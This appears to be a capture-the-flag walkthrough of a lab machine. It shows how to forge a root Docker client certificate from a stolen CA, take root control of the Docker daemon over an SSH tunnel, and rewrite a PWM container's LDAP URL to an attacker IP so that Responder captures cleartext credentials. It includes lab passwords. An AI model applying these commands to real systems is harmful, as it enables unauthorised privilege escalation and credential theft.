## **TLS Certificates**

### Using CA from `certs/`

From the previous step you can create a self-signed certificate as *root* user to access via *SSH*, using the files you have copied to your machine.

### Creating a tunnel

#Attacking_machine 
- Tunnel port **2376**. Credentials: `svc::Friesf00Ds2025!!`

```
ssh svc@<IP> -L 2376:127.0.0.1:2376
```

![[cert_ssh.png]]

### Generating a root certificate

Generate **rootâ€‘signed cert** â†’ full Docker API access.

ğŸ” **1. Generate the client private key**
```
openssl genrsa -out key.pem 2048
```
This becomes your Docker clientâ€™s private key.

ğŸ“ **2. Create a CSR (Certificate Signing Request)**
![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

```
openssl req -new \
  -key key.pem \
  -out client.csr \
  -subj "/CN=root"
```

ğŸ·ï¸ **3. Sign the client certificate using the daemonâ€™s CA**

This is the critical step:

```
openssl x509 -req \
  -in client.csr \
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out cert.pem \
  -days 365 \
  -sha256
```

If the CA files are correct, youâ€™ll see: 
*Signature ok*
*subject=CN=root*

And no errors.

ğŸ” **4. Verify the certificate chain**

**Check subject + issuer:**

```
openssl x509 -in cert.pem -noout -text | grep -E "Issuer|Subject"
```

![[openssl.png]]

You want:

- **Issuer** â†’ matches the CA in `ca.pem`
- **Subject** â†’ `/CN=docker-client`

**Verify trust:**

```
openssl verify -CAfile ca.pem cert.pem
```

Expected:
*cert.pem: OK*

If this fails, the CA files donâ€™t match the daemonâ€™s CA.

ğŸ“ **5. You should now have exactly these three files:**

*ca.pem*
*cert.pem*
*key.pem*

These are the filenames Docker expects.

ğŸš€ **6. Test the Docker TLS connection**

```
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 version
```

If everything is correct, youâ€™ll get both client and server version output â€” meaning you now have **rootâ€‘level control of the Docker daemon**.

![[docker_version.png]]

### Run the Docker

ğŸš€ **Then run Docker with the correct certs**

```
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 ps 
```

![[copntainers_list.png|1454x132]]

TheÂ `container`Â that attracts our attention the most, which is withÂ `ID`Â `f42`, because it's usingÂ `LDAP`, and we can modify anything we want.

### Entering the container

```
docker --tlsverify \                 
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
```

![[container_root.png]]

Now you can investigate inside the container.

### Investigating PWM container

Locate PWM config files (e.g., `PwmConfiguration.xml`).

In the PWM container, the configuration file is always stored in:
*/config/PwmConfiguration.xml*.

#### **Why this file matters**

`PwmConfiguration.xml` contains the LDAP connection settings. By modifying:

```
<ldapServerUrls>
    <value>ldaps://dc01.fries.htb:636</value>
</ldapServerUrls>
```

â€¦to point to your machine:


```
ldap://<ATTACKER_IP>:389
```

PWM will authenticate to _you_, and you capture **cleartext LDAP credentials** via Responder.

Thatâ€™s how you get:

```
svc_infra : m6tneOMAh5p0wQ0d
```

Which unlocks the AD pivot.

#PWM_container
- Run:

```
cat /config/PwmConfiguration.xml | grep "ldap*"
```

![[ldap.serverurls.png]]

- Modify the file to point to yourÂ the *ATTACKING MACHINE IP*Â to capture the service user's credentials while listening withÂ `responder`.

```
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
```